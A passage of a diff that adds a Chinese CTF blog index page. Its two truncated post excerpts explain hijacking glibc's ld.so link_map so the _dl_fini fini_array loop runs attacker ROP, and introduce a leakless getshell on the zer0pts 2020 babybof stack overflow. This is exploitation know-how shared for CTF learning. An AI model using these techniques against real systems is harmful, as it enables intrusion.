+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/" class="post-title-link" itemprop="url">通过劫持ld中的linkmap来控制程序流</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 17:45:11" itemprop="dateCreated datePublished" datetime="2020-07-26T17:45:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:20:34" itemprop="dateModified" datetime="2025-06-26T10:20:34+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在glibc中，当一个程序调用glibc中的exit函数时，exit函数内部会调用_dl_fini，而_dl_fini函数会调用程序中的fini_array段的函数指针去执行。查看glibc源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">internal_function</span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">..........</span><br><span class="line">              <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">              <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">                (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">                        + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">              <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                        / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">              <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">                ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">            &#125;</span><br><span class="line">............</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们注意到，有一个函数指针数组的遍历调用执行。我们来看看ld.so中相应的汇编。</p>
+<p>在glibc2.23 32位ld.so里，是这样的，一个循环，直到esi为0，如果我们能够接触linkmap，就可以控制edi,esi，从而将fini_array转移到我们可以控制的地方，在可控区布下ROP。</p>
+<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image1.png" class>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/07/26/zer0pts_2020_babybof/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/ha1vk/2020/07/26/zer0pts_2020_babybof/" class="post-title-link" itemprop="url">zer0pts_2020_babybof（一种在FULL RELRO情况下无泄漏的getshell方法）</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-07-26 16:24:11" itemprop="dateCreated datePublished" datetime="2020-07-26T16:24:11+08:00">2020-07-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 10:08:14" itemprop="dateModified" datetime="2025-06-26T10:08:14+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>首先，检查一下程序的保护机制</p>
+<img src="/ha1vk/2020/07/26/zer0pts_2020_babybof/image1.png" class>
+
+<p>然后，我们在IDA里分析一下,是一个极其简单的程序，存在栈溢出</p>
+<img src="/ha1vk/2020/07/26/zer0pts_2020_babybof/image2.png" class>
+
+<p>但是程序里没有函数用于泄露，并且FULL RELRO，不能使用ret2dl。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/ha1vk/2020/07/26/zer0pts_2020_babybof/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/ha1vk/page/6/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/ha1vk/">1</a><span class="space">&hellip;</span><a class="page-number" href="/ha1vk/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/ha1vk/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/ha1vk/page/24/">24</a><a class="extend next" rel="next" href="/ha1vk/page/8/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
